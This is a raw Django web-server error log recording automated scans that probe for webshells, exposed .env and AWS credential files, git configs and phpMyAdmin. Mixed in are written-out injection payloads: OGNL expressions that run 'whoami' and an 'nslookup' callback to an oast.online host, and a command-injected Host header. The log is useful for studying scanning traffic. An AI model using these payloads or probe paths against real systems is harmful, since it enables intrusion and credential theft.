Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /geju.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp.php
Not Found: /hoot.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /wp-content/plugins/admin.php
Not Found: /wp-content/db-cache.php
Not Found: /wp-content/themes/twentyeleven/functions.php
Not Found: /wp-content/themes/oceanwp/functions.php
Not Found: /wp-content/themes/twentythirteen/functions.php
Not Found: /wp-content/themes/kadence/functions.php
Not Found: /wp-content/themes/twentytwenty/functions.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /css.php
Not Found: /simple.php
Not Found: /log.php
Not Found: /index.php
Not Found: /mail.php
Not Found: /bak.php
Not Found: /upfile.php
Not Found: /wp-conflg.php
Not Found: /bypass.php
Not Found: /404.php
Not Found: /radio.php
Not Found: /xmrlpc.php
Not Found: /ae.php
Not Found: /moon.php
Not Found: /blog.php
Not Found: /themes.php
Not Found: /ini.php
Not Found: /as.php
Not Found: /shell.php
Not Found: /ws.php
Not Found: /makeasmtp.php
Not Found: /wp-sigunq.php
Not Found: /wso112233.php
Not Found: /fw.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /.env
Not Found: /.env
Not Found: /.env
Not Found: /.aws/credentials
Not Found: /.aws/credentials
Not Found: /.aws/credentials
Not Found: /.aws/credentials
Not Found: /.env.example
Not Found: /.env.example
Not Found: /.env.example
Not Found: /.env.production
Not Found: /.env.example
Not Found: /.env.production
Not Found: /.env.production
Not Found: /.env.production
Not Found: /api/.env
Not Found: /app/.env
Not Found: /api/.env
Not Found: /api/.env
Not Found: /app/.env
Not Found: /app/.env
Not Found: /app_dev.php/_profiler/open
Not Found: /app_dev.php/_profiler/open
Not Found: /app_dev.php/_profiler/phpinfo
Not Found: /backend/.env
Not Found: /core/.env
Not Found: /credentials
Not Found: /crm/.env
Not Found: /demo/.env
Not Found: /info/
Not Found: /infos/
Not Found: /pinfo.php
Not Found: /vendor/.env
Not Found: /.env
Not Found: /backend/.env
Not Found: /api/.env
Not Found: /info/
Not Found: /app_dev.php/_profiler/open
Not Found: /.env.example
Not Found: /phpinfo.php
Not Found: /.env.production
Not Found: /app_dev.php/_profiler/phpinfo
Not Found: /demo/.env
Not Found: /app/.env
Not Found: /core/.env
Not Found: /.aws/credentials
Not Found: /web/debug/default/view
Not Found: /server/.env
Not Found: /config/.env
Not Found: /web/.env
Not Found: /.env.local
Not Found: /html/.env
Not Found: /production/.env
Not Found: /upload/.env
Not Found: /tool/view/phpinfo.view.php
Not Found: /twilio/.env
Not Found: /.config.yaml
Not Found: /data/.env
Not Found: /docs/.env
Not Found: /inc/.env
Not Found: /misc/.env
Not Found: /cms/.env
Not Found: /twilio.env
Not Found: /include/.env
Not Found: /beta/.env
Not Found: /Config/.env
Not Found: /path/.env
Not Found: /public/.env
Not Found: /client_secrets.json
Not Found: /frontend/web/debug/default/view
Not Found: /library/.env
Not Found: /pinfo.php
Not Found: /infos.php
Not Found: /.env.testing
Not Found: /cms/.env.production
Not Found: /download/.env
Not Found: /shared/.env
Not Found: /Api/.env
Not Found: /doc/.env
Not Found: /Laravel/.env
Not Found: /auth/.env
Not Found: /bot/.env
Not Found: /.ENV
Not Found: /repo/.env
Not Found: /.AWS/credentials
Not Found: /robots.txt
Not Found: /vendor/phpunit/phpunit/phpunit.xsd
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /robots.txt
Not Found: /.git/refs/heads/
Not Found: /robots.txt
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /db/dbweb/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /database/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /dbadmin/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /MyAdmin/index.php
Not Found: /PMA/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /sql/websql/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /db/webdb/index.php
Not Found: /mysql/db/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /mysql/web/index.php
Not Found: /php-my-admin/index.php
Not Found: /shopdb/index.php
Not Found: /php-myadmin/index.php
Not Found: /phpmy-admin/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /mysql-admin/index.php
Not Found: /administrator/admin/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /db/webadmin/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /mysql/pma/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /program/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /phpmyadmin/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /administrator/db/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /mysqladmin/index.php
Not Found: /sql/myadmin/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /sql/webdb/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /myadmin/index.php
Not Found: /sqlmanager/index.php
Not Found: /sql/sql/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phppma/index.php
Not Found: /administrator/pma/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /administrator/PMA/index.php
Not Found: /pma/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /mysql/admin/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /administrator/web/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /sql/webadmin/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /mysql/index.php
Not Found: /db/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /db/db-admin/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /mysqlmanager/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /phpmy/index.php
Not Found: /db/myadmin/index.php
Not Found: /mysql/pMA/index.php
Not Found: /db/websql/index.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /system/logs/error.txt
Not Found: /robots.txt
Not Found: /.env
Not Found: /sftp-config.json
Not Found: /.vscode/sftp.json
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /.env
Not Found: /robots.txt
Not Found: /prod/config/.git/config
Not Found: /project/frontend/.git/config
Not Found: /app/dev/.git/config
Not Found: /app/config/.git/config
Not Found: /app/.git/config
Not Found: /config_files/.git/config
Not Found: /user_area/.git/config
Not Found: /core/config/.git/config
Not Found: /dashboard/.git/config
Not Found: /prod/.git/config
Not Found: /repo/.git/config
Not Found: /build_tool/.git/config
Not Found: /libs/js/iframe.js
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /sendgrid/.env
Forbidden (CSRF cookie not set.): /
Not Found: /portal/redlion
Not Found: /login.rsp
Not Found: /robots.txt
Not Found: /.git/refs/tags/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /api/.git/config
Not Found: /config/.git/config
Not Found: /www/.git/config
Not Found: /.env.backup
Not Found: /.env.config
Not Found: /.env.default
Not Found: /.env.dev
Not Found: /.env.production.local
Not Found: /.env.testing
Not Found: /src/.git/config
Not Found: /config.json
Not Found: /.env.dist
Not Found: /.env.local
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
Not Found: /pfblockerng/www/index.php
Not Found: /setup/setupadministrator-start.action
Not Found: /webtools/control/forgotPassword/././ProgramExport
Not Found: /webtools/control/main/ProgramExport
Not Found: /autodiscover/autodiscover.json
Not Found: /confluence/pages/createpage-entervariables.action
Not Found: /users/user-dark-features
Not Found: /wiki/pages/createpage-entervariables.action
Not Found: /template/custom/content-editor
Not Found: /pages/createpage-entervariables.action
Not Found: /wiki/pages/createpage-entervariables.action
Not Found: /pages/createpage-entervariables.action
Not Found: /pages/createpage.action
Not Found: /templates/editor-preload-container
Not Found: /confluence/pages/createpage-entervariables.action
Not Found: /pages/templates2/viewpagetemplate.action
Not Found: /pages/createpage-entervariables.action
Not Found: /pages/doenterpagevariables.action
Not Found: /mgmt/tm/util/bash
Not Found: /${@java.lang.Runtime@getRuntime().exec("nslookup cuuls3rjkkndmoo4luq0fc7cmzbnjtgui.oast.online")}/
Not Found: /server-info.action
Invalid HTTP_HOST header: "' *; host cuuls3rjkkndmoo4luq0j8a8xq6jy46to.oast.online; '". The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: "' *; host cuuls3rjkkndmoo4luq0j8a8xq6jy46to.oast.online; '". The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /pfblockerng/www/index.php
Not Found: /autodiscover/autodiscover.json
Invalid HTTP_HOST header: 'localhost'. You may need to add 'localhost' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'localhost'. You may need to add 'localhost' to ALLOWED_HOSTS.
Bad Request: /mgmt/tm/util/bash
Not Found: /setup/setupadministrator-start.action
Not Found: /setup/setupadministrator.action
Not Found: /dologin.action
Not Found: /welcome.action
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /phpmyadmin/index.php
Not Found: /index.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /login.rsp
Not Found: /.env
Not Found: /robots.txt
Not Found: /autoload_classmap.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp.php
Not Found: /hoot.php
Not Found: /wp-admin.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /gecko-new.php
Not Found: /alfa-rex.php7
Not Found: /wp-content/plugins/admin.php
Not Found: /wp-content/db-cache.php
Not Found: /wp-content/themes/twentyeleven/functions.php
Not Found: /wp-content/themes/oceanwp/functions.php
Not Found: /wp-content/themes/twentythirteen/functions.php
Not Found: /wp-content/themes/kadence/functions.php
Not Found: /wp-content/themes/twentytwenty/functions.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /css.php
Not Found: /simple.php
Not Found: /log.php
Not Found: /index.php
Not Found: /mail.php
Not Found: /bak.php
Not Found: /upfile.php
Not Found: /wp-conflg.php
Not Found: /bypass.php
Not Found: /404.php
Not Found: /radio.php
Not Found: /xmrlpc.php
Not Found: /ae.php
Not Found: /moon.php
Not Found: /blog.php
Not Found: /themes.php
Not Found: /ini.php
Not Found: /as.php
Not Found: /shell.php
Not Found: /ws.php
Not Found: /makeasmtp.php
Not Found: /wp-sigunq.php
Not Found: /wso112233.php
Not Found: /fw.php
Not Found: /install.php
Not Found: /wp-login.php
Not Found: /wp-content/plugins/google-seo-rank/module.php
Not Found: /chosen.php
Not Found: /inputs.php
Not Found: /classsmtps.php
Not Found: /wp-blog-header.php
Not Found: /wp-trackback.php
Not Found: /wp-signup.php
Not Found: /wp-comments-post.php
Not Found: /wp-cron.php
Not Found: /wp-load.php
Not Found: /wp-mail.php
Not Found: /edit.php
Not Found: /wp-activate.php
Not Found: /plugins.php
Not Found: /post.php
Not Found: /wp-2019.php
Not Found: /autoload_classmap.php
Not Found: /1.php
Not Found: /flower.php
Not Found: /file.php
Not Found: /meta.php
Not Found: /randkeyword.php
Not Found: /goods.php
Not Found: /hehe.php
Not Found: /yindu.php
Not Found: /wp-admin/class-db.php
Not Found: /baxa1.phP8
Not Found: /baxa1.php
Not Found: /.well-known//index.php
Not Found: /libraries/phpmailer//index.php
Not Found: /wp-admin/autoload_classmap.php
Not Found: /wp-admin/css/colors/blue//1.php
Not Found: /wp-content/plugins//about.php
Not Found: /wp-content/plugins//index.php
